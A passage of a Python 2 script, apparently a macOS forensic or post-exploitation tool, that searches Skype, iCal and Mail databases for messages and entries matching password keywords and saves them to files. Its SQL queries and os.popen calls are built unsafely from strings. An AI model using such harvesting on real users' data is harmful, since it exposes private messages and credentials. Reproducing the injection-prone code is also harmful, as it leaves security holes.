					sql_request_plus = "SELECT id,extprop_chatmsg_ft_index_timestamp,author,body_xml,chatname FROM Messages where id LIKE '"+ str(id_skype_plus) + "'"
					cur.execute(sql_request_plus)
					rows_plus = cur.fetchall()
					for row_plus in rows_plus:
						request = "Author:%s \n  Message:%s \n" % (row_plus["author"], row_plus["body_xml"])
						print_green(request)
						to_record = "\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)
					
					counter = counter + 1
					if counter == 5 and jump == 0 : 
						res=raw_input("Press enter to continue (j to jump) > ")
						counter = 0
						if res == 'j':
							jump = 1
		except lite.Error, e:	    
		    print_red("Error %s:" % e.args[0])	
		finally:
		    if con:
		        con.close()

	print_log("\nResults are stored into " + output_display + "\n")
	raw_input("Press any key to continue...")



def fct_read_special_skype(db_skype_to_analyse):
	keyword=raw_input("Enter your keyword > ")
			
	#to record
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	output_display = name_dir_analysis + var_date_display + "_SKYPE_KEYWORD-" + keyword + ".txt"
	print_log("\nResults will be stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	id_prec=999999999999999
	con = None
	try:
	    con = lite.connect(db_skype_to_analyse)
	    with con:
			con.row_factory = lite.Row
			cur = con.cursor()
			fct_writefile("\n====================================\n[Wanted Keyword] : " + keyword + "\n====================================", output_display)

			#SELECT extprop_chatmsg_ft_index_timestamp,author,body_xml,chatname FROM Messages where body_xml LIKE '%passw%';
			sql_request = "SELECT convo_id FROM Messages where body_xml LIKE '%" + keyword + "%'"
			cur.execute(sql_request)
			rows = cur.fetchall()
			for row in rows:
				convo_id_skype = int(row["convo_id"])
				sql_request_plus = "SELECT id,convo_id,extprop_chatmsg_ft_index_timestamp,author,body_xml,chatname FROM Messages where convo_id LIKE '"+ str(convo_id_skype) + "' ORDER BY id DESC"
				cur.execute(sql_request_plus)
				rows_plus = cur.fetchall()
				for row_plus in rows_plus:
					if int(row_plus["convo_id"]) != id_prec:
						extprop_chatmsg_ft_index_timestamp=str(row_plus["extprop_chatmsg_ft_index_timestamp"])
						if extprop_chatmsg_ft_index_timestamp == "None" : 
							print_log("\n\nchatname:%s " % (row_plus["chatname"]))
							raw_input()
							request = "\nAuthor:%s \n  Message:%s" % (row_plus["author"],row_plus["body_xml"])
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display)
						else: 
							print_log("\n\n[chatname]:%s \nDate:%s" % (row_plus["chatname"],datetime.datetime.fromtimestamp(int(extprop_chatmsg_ft_index_timestamp[0:10])).strftime('%Y-%m-%d %H:%M:%S')))
							raw_input()
							request = "\nAuthor:%s \n  Message:%s" % (row_plus["author"],row_plus["body_xml"])
							print_green(request)	
							to_record="\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display)
					else: 
						request = "Author:%s \n  Message:%s" % (row_plus["author"], row_plus["body_xml"])
						print_green(request)
						to_record = "\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)

					id_prec = row_plus["convo_id"]
	except lite.Error, e:	    
	    print_red("Error %s:" % e.args[0])	
	finally:
	    if con:
	        con.close()

	print_log("\nResults are stored into " + output_display + "\n")
	raw_input("Press any key to continue...")


####################################################################################################################################
											#[Exploit iCal]
####################################################################################################################################
def fct_exploit_ical():
	print_red("\n\n========================================================================")
	print_red("                 ==== Exploit iCal containing ====")
	print_red("========================================================================")

	if os.path.exists(file_log_calendar):
		file = open(file_log_calendar,'r')
		lines_log_calendar = file.readlines()
		file.close()

		tab_results = []
		
		filtre = re.compile('^.+\ to\ (.+)\/(.+)$',re.IGNORECASE)
		for i in range(len(lines_log_calendar)):
			res = filtre.findall(lines_log_calendar[i])
			for one_line in res:
				path_file_db = one_line[0]
				file_db = one_line[1].replace("\ "," ")
				tab_results.append(file_db)
		
		db_ical_to_analyse = "null"
		while db_ical_to_analyse == "null":
			print_log("\nAvailable iCal files > ")
			for j in range(len(tab_results)):
				print_green(str(j) + ". " + tab_results[j])
				
			db_ical_to_analyse = raw_input("\nChoose iCal file (b to back) > ")
			
			if db_ical_to_analyse != "b":
				try:
					intORnot = int(db_ical_to_analyse)
					if int(db_ical_to_analyse) < len(tab_results):
						ical_name = tab_results[int(db_ical_to_analyse)]
						db_ical_to_analyse = path_file_db + "/" + ical_name

						var_analysis = "null"
						while var_analysis == "null": 
							print_log  ("\nAnalysis of : " + db_ical_to_analyse)
							print_green("========================================================================")

							print_green("1: Display/Record all Events and Reminders")
							print_green("2: Display/Record Events and Reminders containing secret information")
							print_green("3: Display/Record Events and Reminders containing special keyword")
							print_green("b: Back")
							var_analysis = raw_input("Analysis to launch > ")
							if var_analysis == "1": 
								fct_read_all_ical(db_ical_to_analyse)
								var_analysis = "null"
							elif var_analysis == "2": 
								fct_read_pass_ical(db_ical_to_analyse)
								var_analysis = "null"
							elif var_analysis == "3": 
								fct_read_special_ical(db_ical_to_analyse)
								var_analysis = "null"
							elif var_analysis == "b":
								db_ical_to_analyse = "null"
							else:
								var_analysis = "null"
								print_red("\nPlease to choose a valid option\n")
					else:
						print_red("\nPlease to choose a valid iCal database\n")
						db_ical_to_analyse = "null"

				except ValueError:
					print_red("\nPlease to choose a valid iCal database\n")
					db_ical_to_analyse = "null"

	else: 
		print_log("No recording ...")
	print_red("\n========================================================================")
	print_red("                 ==== \Exploit iCal containing ====")
	print_red("========================================================================")


def fct_read_all_ical(db_ical_to_analyse):

	print_red("\n                 ====  Display EVENTS ====\n")

	#to record
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	output_display = name_dir_analysis + var_date_display + "_EVENTS_ALL.txt"
	print_log("\nResults will be stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	fct_writefile("\n====================================\n[EVENTS]\n====================================", output_display)

	con = None
	try:
	    con = lite.connect(db_ical_to_analyse)
	    with con:
			con.row_factory = lite.Row
			cur = con.cursor()
			if "10.6" in target_version : sql_request="SELECT ZTITLE,ZLOCATION,ZNOTES,ZORGANIZERCOMMONNAME,ZSTARTDATE,Z_ENT FROM ZCALENDARITEM where Z_ENT=8 ORDER BY ZSTARTDATE DESC "
			else : sql_request = "SELECT ZTITLE,ZLOCATION,ZNOTES,ZORGANIZERCOMMONNAME,ZSTARTDATE,Z_ENT FROM ZICSELEMENT where (Z_ENT=23 OR Z_ENT=31) ORDER BY ZSTARTDATE DESC "
			cur.execute(sql_request)
			rows = cur.fetchall()
			counter = 0
			jump = 0
			for row in rows:
				zstartdate=str(row["ZSTARTDATE"])
				if zstartdate == "None":
					request = "Title: %s \n  Localisation: %s \n  Note: %s \n  Organizer: %s \n" % (row["ZTITLE"],row["ZLOCATION"],row["ZNOTES"],row["ZORGANIZERCOMMONNAME"])
					print_green(request)
					to_record = "\n" + request.encode('utf-8')
					fct_writefile(to_record, output_display)
				else:
					zstartdate=os.popen("date -r " + zstartdate[0:10] + " -v+31y").read().strip("\n")
					zstartdate = unicode(zstartdate, "utf8")
					request = "Title: %s \n  Localisation: %s \n  Note: %s \n  Organizer: %s \n  Date: %s \n" % (row["ZTITLE"],row["ZLOCATION"],row["ZNOTES"],row["ZORGANIZERCOMMONNAME"],zstartdate)
					print_green(request)
					to_record = "\n" + request.encode('utf-8')
					fct_writefile(to_record, output_display)

				counter = counter + 1
				if counter == 5 and jump == 0: 
					res = raw_input("Press enter to continue (j to jump) > ")
					counter = 0
					if res == 'j':
						jump = 1
	except lite.Error, e:	    
	    print_red("Error %s:" % e.args[0])
	finally:
	    if con:
	        con.close()
	
	print_log("\nResults are stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	print_red("\n                 ====  \\Display EVENTS ====")




	if "10.6" not in target_version:
		print_red("\n\n                 ====  Display REMINDERS ====\n")

		var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
		output_display = name_dir_analysis + var_date_display + "_REMINDERS_ALL.txt"
		print_log("\nResults will be stored into " + output_display + "\n")
		raw_input("Press any key to continue...")
		
		fct_writefile("\n====================================\n[REMINDERS]\n====================================", output_display)

		try:
		    con = None
		    con = lite.connect(db_ical_to_analyse)
		    with con:
				con.row_factory = lite.Row
				cur = con.cursor()
				sql_request = "SELECT ZTITLE,ZCREATIONDATE,ZSTATUS,ZCOMPLETEDDATE,Z_ENT FROM ZICSELEMENT where (Z_ENT=24 OR Z_ENT=32) ORDER BY ZCREATIONDATE DESC "
				cur.execute(sql_request)
				rows = cur.fetchall()
				counter = 0
				jump = 0
				for row in rows:
					zstatus=str(row["ZSTATUS"])
					zcreationdate=str(row["ZCREATIONDATE"])
					zcreationdate=os.popen("date -r " + zcreationdate[0:10] + " -v+31y").read().strip("\n")
					zcreationdate = unicode(zcreationdate, "utf8")
					zcompletddate=str(row["ZCOMPLETEDDATE"])
					
					if zstatus == "None":
						request = "Title: %s \n  Status: %s \n  Creation date: %s \n" % (row["ZTITLE"],"NOT COMPLETED",zcreationdate)
						print_green(request)
						to_record = "\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)
					else:
						zcompletddate=os.popen("date -r " + zcompletddate[0:10] + " -v+31y").read().strip("\n")
						zcompletddate = unicode(zcompletddate, "utf8")
						request = "Title: %s \n  Status: %s \n  Creation date: %s \n  Completed date: %s \n" % (row["ZTITLE"],zstatus,zcreationdate,zcompletddate)
						print_green(request)
						to_record = "\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)

					counter = counter + 1
					if counter == 5 and jump == 0: 
						res=raw_input("Press enter to continue (j to jump) > ")
						counter = 0
						if res == 'j':
							jump = 1
		except lite.Error, e:	    
		    print_red("Error %s:" % e.args[0])
		finally:
		    if con:
		        con.close()
		
		print_log("\nResults are stored into " + output_display + "\n")
		raw_input("Press any key to continue...")

		print_red("\n                 ====  \\Display REMINDERS ====")



def fct_read_pass_ical(db_ical_to_analyse):
	
	file = open(db_keywords_pass,'r')
	lines_keywords_pass = file.readlines()
	file.close()

	print_red("\n                 ====  Display EVENTS ====\n")
	
	#to record
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	output_display = name_dir_analysis + var_date_display + "_EVENTS_PASS.txt"
	print_log("\nResults will be stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	fct_writefile("\n====================================\n[EVENTS]\n====================================", output_display)

	for j in range(len(lines_keywords_pass)):
		con = None
		try:
		    con = lite.connect(db_ical_to_analyse)
		    with con:
				con.row_factory = lite.Row
				cur = con.cursor()
				print_log("\n[Wanted Keyword] : " + lines_keywords_pass[j].strip("\n"))
				fct_writefile("\n====================================\n[Wanted Keyword] : " + lines_keywords_pass[j].strip("\n") + "\n====================================", output_display)
				raw_input()
				if "10.6" in target_version:
					sql_request = "SELECT ZTITLE,ZLOCATION,ZNOTES,ZORGANIZERCOMMONNAME,ZSTARTDATE,Z_ENT FROM ZCALENDARITEM where Z_ENT=8 And (ZNOTES LIKE '%" + lines_keywords_pass[j].strip('\n') + "%' OR ZTITLE LIKE '%" + lines_keywords_pass[j].strip('\n') + "%') ORDER BY ZSTARTDATE DESC"
				else:
					sql_request = "SELECT ZTITLE,ZLOCATION,ZNOTES,ZORGANIZERCOMMONNAME,ZSTARTDATE,Z_ENT FROM ZICSELEMENT where (Z_ENT=23 OR Z_ENT=31) And (ZNOTES LIKE '%" + lines_keywords_pass[j].strip('\n') + "%' OR ZTITLE LIKE '%" + lines_keywords_pass[j].strip('\n') + "%') ORDER BY ZSTARTDATE DESC"
				cur.execute(sql_request)
				rows = cur.fetchall()
				counter = 0
				jump = 0
				for row in rows:
					zstartdate = str(row["ZSTARTDATE"])
					if zstartdate == "None":
						request = "Title: %s \n  Localisation: %s \n  Note: %s \n  Organizer: %s \n" % (row["ZTITLE"],row["ZLOCATION"],row["ZNOTES"],row["ZORGANIZERCOMMONNAME"])
						print_green(request)
						to_record = "\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)
					else:
						zstartdate = os.popen("date -r " + zstartdate[0:10] + " -v+31y").read().strip("\n")
						zstartdate = unicode(zstartdate, "utf8")
						request = "Title: %s \n  Localisation: %s \n  Note: %s \n  Organizer: %s \n  Date: %s \n" % (row["ZTITLE"],row["ZLOCATION"],row["ZNOTES"],row["ZORGANIZERCOMMONNAME"],zstartdate)
						print_green(request)
						to_record = "\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)

					counter = counter + 1
					if counter == 5 and jump == 0 : 
						res = raw_input("Press enter to continue (j to jump) > ")
						counter = 0
						if res == 'j':
							jump = 1
		except lite.Error, e:	    
		    print_red("Error %s:" % e.args[0])
		finally:
		    if con:
		        con.close()
	
	print_log("\nResults are stored into " + output_display + "\n")
	raw_input("Press any key to continue...")
	
	print_red("\n                 ====  \\Display EVENTS ====")
	



	if "10.6" not in target_version: 
		print_red("\n\n                 ====  Display REMINDERS ====\n")
		
		#to record
		var_date_display=time.strftime('%y%m%d-%Hh%M%S',time.localtime())
		output_display=name_dir_analysis + var_date_display + "_REMINDERS_PASS.txt"
		print_log("\nResults will be stored into " + output_display + "\n")
		raw_input("Press any key to continue...")

		for j in range(len(lines_keywords_pass)):
			con = None
			try:
			    con = lite.connect(db_ical_to_analyse)
			    with con:
					con.row_factory = lite.Row
					cur = con.cursor()
					print_log("\n[Wanted Keyword] : " + lines_keywords_pass[j].strip("\n"))
					fct_writefile("\n====================================\n[Wanted Keyword] : " + lines_keywords_pass[j].strip("\n") + "\n====================================", output_display)
					raw_input()
					#SELECT ZTITLE,ZCREATIONDATE,ZSTATUS,ZCOMPLETEDDATE,Z_ENT FROM ZICSELEMENT where Z_ENT=24 order by ZCREATIONDATE 
					sql_request="SELECT ZTITLE,ZCREATIONDATE,ZSTATUS,ZCOMPLETEDDATE,Z_ENT FROM ZICSELEMENT where (Z_ENT=24 OR Z_ENT=32) And (ZNOTES LIKE '%" + lines_keywords_pass[j].strip('\n') + "%' OR ZTITLE LIKE '%" + lines_keywords_pass[j].strip('\n') + "%') ORDER BY ZCREATIONDATE DESC"
					cur.execute(sql_request)
					rows = cur.fetchall()
					counter = 0
					jump = 0
					for row in rows:
						zstatus=str(row["ZSTATUS"])
						zcreationdate=str(row["ZCREATIONDATE"])
						zcreationdate=os.popen("date -r " + zcreationdate[0:10] + " -v+31y").read().strip("\n")
						zcreationdate = unicode(zcreationdate, "utf8")
						zcompletddate=str(row["ZCOMPLETEDDATE"])
						
						if zstatus == "None":
							request = "Title: %s \n  Status: %s \n  Creation date: %s \n" % (row["ZTITLE"],"NOT COMPLETED",zcreationdate)
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display)

						else:
							zcompletddate = os.popen("date -r " + zcompletddate[0:10] + " -v+31y").read().strip("\n")
							zcompletddate = unicode(zcompletddate, "utf8")
							request = "Title: %s \n  Status: %s \n  Creation date: %s \n  Completed date: %s \n" % (row["ZTITLE"],zstatus,zcreationdate,zcompletddate)
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display)

						counter = counter + 1
						if counter == 5 and jump == 0 : 
							res=raw_input("Press enter to continue (j to jump) > ")
							counter = 0
							if res == 'j':
								jump = 1
			except lite.Error, e:	    
			    print_red("Error %s:" % e.args[0])
			finally:
			    if con:
			        con.close()
		
		print_log("\nResults are stored into " + output_display + "\n")
		raw_input("Press any key to continue...")
		
		print_red("\n                 ====  \\Display REMINDERS ====")




def fct_read_special_ical(db_ical_to_analyse):
	keyword = raw_input("Enter your keyword > ")
	
	print_red("\n                 ====  Display EVENTS ====\n")
	
	#to record
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	output_display = name_dir_analysis + var_date_display + "_EVENTS_KEYWORD-" + keyword + ".txt"
	print_log("\nResults will be stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	fct_writefile("\n====================================\n[Wanted Keyword] : " + keyword + "\n====================================", output_display)

	con = None
	try:
	    con = lite.connect(db_ical_to_analyse)
	    with con:
			con.row_factory = lite.Row
			cur = con.cursor()
			if "10.6" in target_version:
				sql_request = "SELECT ZTITLE,ZLOCATION,ZNOTES,ZORGANIZERCOMMONNAME,ZSTARTDATE,Z_ENT FROM ZCALENDARITEM where Z_ENT=8 And (ZNOTES LIKE '%" + keyword.strip('\n') + "%' OR ZTITLE LIKE '%" + keyword.strip('\n') + "%') ORDER BY ZSTARTDATE DESC"
			else:
				sql_request="SELECT ZTITLE,ZLOCATION,ZNOTES,ZORGANIZERCOMMONNAME,ZSTARTDATE,Z_ENT FROM ZICSELEMENT where (Z_ENT=23 OR Z_ENT=31) And (ZNOTES LIKE '%" + keyword.strip('\n') + "%' OR ZTITLE LIKE '%" + keyword.strip('\n') + "%') ORDER BY ZSTARTDATE DESC"
			cur.execute(sql_request)
			rows = cur.fetchall()
			counter = 0
			jump = 0
			for row in rows:
				zstartdate = str(row["ZSTARTDATE"])
				if zstartdate == "None": 
					print_green("Title: %s \n  Localisation: %s \n  Note: %s \n  Organizer: %s \n" % (row["ZTITLE"],row["ZLOCATION"],row["ZNOTES"],row["ZORGANIZERCOMMONNAME"]))
					to_record = "\nTitle: %s \n  Localisation: %s \n  Note: %s \n  Organizer: %s \n" % (row["ZTITLE"],row["ZLOCATION"],row["ZNOTES"],row["ZORGANIZERCOMMONNAME"])
					to_record = to_record.encode('utf-8')
					fct_writefile(to_record, output_display)
				else:
					zstartdate = os.popen("date -r " + zstartdate[0:10] + " -v+31y").read().strip("\n")
					zstartdate = unicode(zstartdate, "utf8")
					print_green("Title: %s \n  Localisation: %s \n  Note: %s \n  Organizer: %s \n  Date: %s \n" % (row["ZTITLE"],row["ZLOCATION"],row["ZNOTES"],row["ZORGANIZERCOMMONNAME"],zstartdate))
					to_record = "\nTitle: %s \n  Localisation: %s \n  Note: %s \n  Organizer: %s \n  Date: %s \n" % (row["ZTITLE"],row["ZLOCATION"],row["ZNOTES"],row["ZORGANIZERCOMMONNAME"],zstartdate)
					to_record = to_record.encode('utf-8')
					fct_writefile(to_record, output_display)

				counter = counter + 1
				if counter == 5 and jump == 0: 
					res=raw_input("Press enter to continue (j to jump) > ")
					counter = 0
					if res == 'j':
						jump=1
	except lite.Error, e:	    
	    print_red("Error %s:" % e.args[0])	
	finally:
	    if con:
	        con.close()
	
	print_log("\nResults are stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	print_red("\n                 ====  \\Display EVENTS ====")


	if "10.6" not in target_version : 
		print_red("\n\n                 ====  Display REMINDERS ====\n")
		#to record
		var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
		output_display = name_dir_analysis + var_date_display + "_REMINDERS_KEYWORD-" + keyword + ".txt"
		print_log("\nResults will be stored into " + output_display + "\n")
		raw_input("Press any key to continue...")

		fct_writefile("\n====================================\n[Wanted Keyword] : " + keyword + "\n====================================", output_display)
		
		try:
		    con = None
		    con = lite.connect(db_ical_to_analyse)
		    with con:
				con.row_factory = lite.Row
				cur = con.cursor()
				sql_request = "SELECT ZTITLE,ZCREATIONDATE,ZSTATUS,ZCOMPLETEDDATE,Z_ENT FROM ZICSELEMENT where (Z_ENT=24 OR Z_ENT=32) And ZTITLE LIKE '%" + keyword.strip('\n') + "%' ORDER BY ZCREATIONDATE DESC "
				cur.execute(sql_request)
				rows = cur.fetchall()
				counter = 0
				jump = 0
				for row in rows:
					zstatus=str(row["ZSTATUS"])
					zcreationdate = str(row["ZCREATIONDATE"])
					zcreationdate = os.popen("date -r " + zcreationdate[0:10] + " -v+31y").read().strip("\n")
					zcreationdate = unicode(zcreationdate, "utf8")
					zcompletddate = str(row["ZCOMPLETEDDATE"])
					
					if zstatus == "None" : 
						print_green("Title: %s \n  Status: %s \n  Creation date: %s \n" % (row["ZTITLE"],"NOT COMPLETED",zcreationdate))
						to_record = "\nTitle: %s \n  Status: %s \n  Creation date: %s \n" % (row["ZTITLE"],"NOT COMPLETED",zcreationdate)
						to_record = to_record.encode('utf-8')
						fct_writefile(to_record, output_display)
					else :
						zcompletddate = os.popen("date -r " + zcompletddate[0:10] + " -v+31y").read().strip("\n")
						zcompletddate = unicode(zcompletddate, "utf8")
						print_green("Title: %s \n  Status: %s \n  Creation date: %s \n  Completed date: %s \n" % (row["ZTITLE"],zstatus,zcreationdate,zcompletddate))
						to_record = "\nTitle: %s \n  Status: %s \n  Creation date: %s \n  Completed date: %s \n" % (row["ZTITLE"],zstatus,zcreationdate,zcompletddate)
						to_record = to_record.encode('utf-8')
						fct_writefile(to_record, output_display)
					
					counter = counter + 1
					if counter == 5 and jump == 0: 
						res = raw_input("Press enter to continue (j to jump) > ")
						counter = 0
						if res == 'j':
							jump=1
		except lite.Error, e:	    
		    print_red("Error %s:" % e.args[0])	
		finally:
		    if con:
		        con.close()
		
		print_log("\nResults are stored into " + output_display + "\n")
		raw_input("Press any key to continue...")
		
		print_red("\n                 ====  \\Display REMINDERS ====")


####################################################################################################################################
											#[Exploit eMail]
####################################################################################################################################
def fct_exploit_emails():

	print_red("\n\n========================================================================")
	print_red("                 ==== Exploit Email messages ====")
	print_red("========================================================================")

	if "10.6" in target_version: 
		print_log("Snow Leopard is not supported ... :()")
	else: 
		if os.path.exists(file_log_email_spot):
			file=open(file_log_email_spot,'r')
			lines_log_email_spot=file.readlines()
			file.close()

			tab_results = []
			
			filtre=re.compile('^.+\ to\ (.+)\/(.+)$',re.IGNORECASE)
			for i in range(len(lines_log_email_spot)):
				res=filtre.findall(lines_log_email_spot[i])
				for one_line in res:
					path_file_db = one_line[0]
					file_db = one_line[1].replace("\ "," ")
					tab_results.append(file_db)

			db_email_to_analyse = "null"
			while db_email_to_analyse == "null":
				print_log("\nAvailable Email Database files > ")
				for j in range(len(tab_results)):
					print_green(str(j) + ". " + tab_results[j])
					
				db_email_to_analyse = raw_input("\nChoose a Email database (b to back) > ")
				
				if db_email_to_analyse != "b":
				
					try:
						intORnot = int(db_email_to_analyse)
						if int(db_email_to_analyse) < len(tab_results):
							email_name = tab_results[int(db_email_to_analyse)]
							db_email_to_analyse = path_file_db + "/" + email_name
							 
							var_analysis = "null"
							while var_analysis == "null": 
								print_log  ("\nAnalysis of : " + db_email_to_analyse)
								print_green("========================================================================")

								print_green("1: Display/Record all emails (can take a long time)")
								print_green("2: Display/Record all emails containing secret information")
								print_green("3: Display/Record all emails containing a special keyword")
								print_green("4: Identify a special emlx file into Mail box \n   by entering Emlx ID identified by option 1, 2 or 3")
								print_green("b: Back")
								var_analysis = raw_input("Analysis to launch > ")

								if var_analysis == "1": 
									fct_read_all_email(db_email_to_analyse)
									var_analysis = "null"
								elif var_analysis == "2": 
									fct_read_pass_email(db_email_to_analyse)
									var_analysis = "null"
								elif var_analysis == "3": 
									fct_read_special_email(db_email_to_analyse)
									var_analysis = "null"
								elif var_analysis == "4": 
									fct_search_emlx()
									var_analysis = "null"
								elif var_analysis == "b":
									db_email_to_analyse = "null"
								else:
									var_analysis = "null"
									print_red("\nPlease to choose a valid option\n")
						
						else:
							print_red("\nPlease to choose a valid Email database\n")
							db_email_to_analyse = "null"
					except ValueError:
						print_red("\nPlease to choose a valid Email database\n")
						db_email_to_analyse = "null"
		else:
			print_log("No recording ...")
	print_red("\n========================================================================")
	print_red("                 ==== \Exploit Email messages ====")
	print_red("========================================================================")


def fct_read_all_email(db_email_to_analyse):
	#to record
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	output_display = name_dir_analysis + var_date_display + "_EMAILS_ALL.txt"
	print_log("\nResults will be stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	con = None
	try:
		con = lite.connect(db_email_to_analyse)
		with con:
			con.row_factory = lite.Row
			cur = con.cursor()
			#SELECT date_created,conversation_id,addresses.rowid,addresses.address,subjects.rowid,subjects.subject,messages.subject,snippet,mailbox,sender,mailboxes.url FROM messages, mailboxes, subjects, addresses WHERE (messages.mailbox=mailboxes.rowid and messages.subject=subjects.rowid and sender=addresses.rowid and snippet LIKE '%mot de passe%');
			sql_request = "SELECT date_created,conversation_id,addresses.address,subjects.subject,messages.rowid,messages.subject,snippet,mailbox,sender,mailboxes.url FROM messages, mailboxes, subjects, addresses WHERE (messages.mailbox=mailboxes.rowid) and (messages.subject=subjects.rowid) and (sender=addresses.rowid) ORDER BY conversation_id DESC"						
			cur.execute(sql_request)
			rows = cur.fetchall()
			counter = 0
			jump = 0

			for row in rows:
				date_created = str(row["date_created"])
				if date_created == "None" :
					request = "Subject:%s \n  Sender:%s \n  Message:%s \n  Emlx ID:%s \n  Mbox:%s \n" % (row["subject"],row["address"],row["snippet"],row["rowid"],row["url"])
					print_green(request)
					to_record = "\n" + request.encode('utf-8')
					fct_writefile(to_record, output_display)
				else : 
					request = "Subject:%s \n  Date:%s \n  Sender:%s \n  Message:%s  \n  Emlx ID:%s \n  Mbox:%s \n" % (row["subject"],datetime.datetime.fromtimestamp(int(date_created[0:10])).strftime('%Y-%m-%d %H:%M:%S'),row["address"],row["snippet"],row["rowid"],row["url"])
					print_green(request)
					to_record = "\n" + request.encode('utf-8')
					fct_writefile(to_record, output_display)

				counter = counter + 1
				if counter == 5 and jump == 0 : 
					res = raw_input("Press enter to continue (j to jump) > ")
					counter = 0
					if res == 'j':
						jump = 1
	except lite.Error, e:	    
	    print_red("Error %s:" % e.args[0])
	finally:
	    if con:
	        con.close()

	print_log("\nResults are stored into " + output_display + "\n")
	raw_input("Press any key to continue...")


def fct_read_pass_email(db_email_to_analyse):

	file = open(db_keywords_pass,'r')
	lines_keywords_pass = file.readlines()
	file.close()

	#to record
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	output_display = name_dir_analysis + var_date_display + "_EMAILS_PASS.txt"
	print_log("\nResults will be stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	for j in range(len(lines_keywords_pass)):
		con = None
		try:
			con = lite.connect(db_email_to_analyse)
			with con:
				con.row_factory = lite.Row
				cur = con.cursor()
				print_log("\n[Wanted Keyword] : " + lines_keywords_pass[j].strip("\n"))
				fct_writefile("====================================\n[Wanted Keyword] : " + lines_keywords_pass[j].strip("\n") + "\n====================================", output_display)
				raw_input()
				#SELECT date_created,conversation_id,addresses.rowid,addresses.address,subjects.rowid,subjects.subject,messages.subject,snippet,mailbox,sender,mailboxes.url FROM messages, mailboxes, subjects, addresses WHERE (messages.mailbox=mailboxes.rowid and messages.subject=subjects.rowid and sender=addresses.rowid and snippet LIKE '%mot de passe%');
				sql_request = "SELECT date_created,conversation_id,addresses.address,subjects.subject,messages.rowid,messages.subject,snippet,mailbox,sender,mailboxes.url FROM messages, mailboxes, subjects, addresses WHERE (messages.mailbox=mailboxes.rowid) and (messages.subject=subjects.rowid) and (sender=addresses.rowid ) and (snippet LIKE '%" + lines_keywords_pass[j].strip('\n') + "%' OR subjects.subject LIKE '%" + lines_keywords_pass[j].strip('\n') + "%') ORDER BY conversation_id DESC"						
				cur.execute(sql_request)
				rows = cur.fetchall()
				counter = 0
				jump = 0

				for row in rows:
					date_created = str(row["date_created"])
					if date_created == "None" : 
						request = "Subject:%s \n  Sender:%s \n  Message:%s \n  Emlx ID:%s \n  Mbox:%s \n" % (row["subject"],row["address"],row["snippet"],row["rowid"],row["url"])
						print_green(request)
						to_record = "\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)
					else : 
						request = "Subject:%s \n  Date:%s \n  Sender:%s \n  Message:%s  \n  Emlx ID:%s \n  Mbox:%s \n" % (row["subject"],datetime.datetime.fromtimestamp(int(date_created[0:10])).strftime('%Y-%m-%d %H:%M:%S'),row["address"],row["snippet"],row["rowid"],row["url"])
						print_green(request)
						to_record = "\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)

					counter = counter + 1
					if counter == 5 and jump == 0 : 
						res=raw_input("Press enter to continue (j to jump) > ")
						counter = 0
						if res == 'j':
							jump = 1
		except lite.Error, e:	    
		    print("Error %s:" % e.args[0])	
		finally:
		    if con:
		        con.close()

	print_log("\nResults are stored into " + output_display + "\n")
	raw_input("Press any key to continue...")


def fct_read_special_email(db_email_to_analyse):
	
	keyword = raw_input("Enter your keyword > ")

	#to record
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	output_display = name_dir_analysis + var_date_display + "_EMAILS_KEYWORD-" + keyword + ".txt"
	print_log("\nResults will be stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	con = None
	try:
		con = lite.connect(db_email_to_analyse)
		with con:
			con.row_factory = lite.Row
			cur = con.cursor()
			fct_writefile("====================================\n[Wanted Keyword] : " + keyword + "\n====================================", output_display)
			#SELECT date_created,conversation_id,addresses.rowid,addresses.address,subjects.rowid,subjects.subject,messages.subject,snippet,mailbox,sender,mailboxes.url FROM messages, mailboxes, subjects, addresses WHERE (messages.mailbox=mailboxes.rowid and messages.subject=subjects.rowid and sender=addresses.rowid and snippet LIKE '%mot de passe%');
			sql_request = "SELECT date_created,conversation_id,addresses.address,subjects.subject,messages.rowid,messages.subject,snippet,mailbox,sender,mailboxes.url FROM messages, mailboxes, subjects, addresses WHERE (messages.mailbox=mailboxes.rowid) and (messages.subject=subjects.rowid) and (sender=addresses.rowid ) and (snippet LIKE '%" + keyword + "%' OR subjects.subject LIKE '%" + keyword + "%' OR addresses.address LIKE '%" + keyword + "%') ORDER BY conversation_id DESC"						
			cur.execute(sql_request)
			rows = cur.fetchall()
			counter = 0
			jump = 0

			for row in rows:
				#print row.keys()
				date_created = str(row["date_created"])
				if date_created == "None" : 
					request = "Subject:%s \n  Sender:%s \n  Message:%s \n  Emlx ID:%s \n  Mbox:%s \n" % (row["subject"],row["address"],row["snippet"],row["rowid"],row["url"])
					print_green(request)
					to_record = "\n" + request.encode('utf-8')
					fct_writefile(to_record, output_display)
				else : 
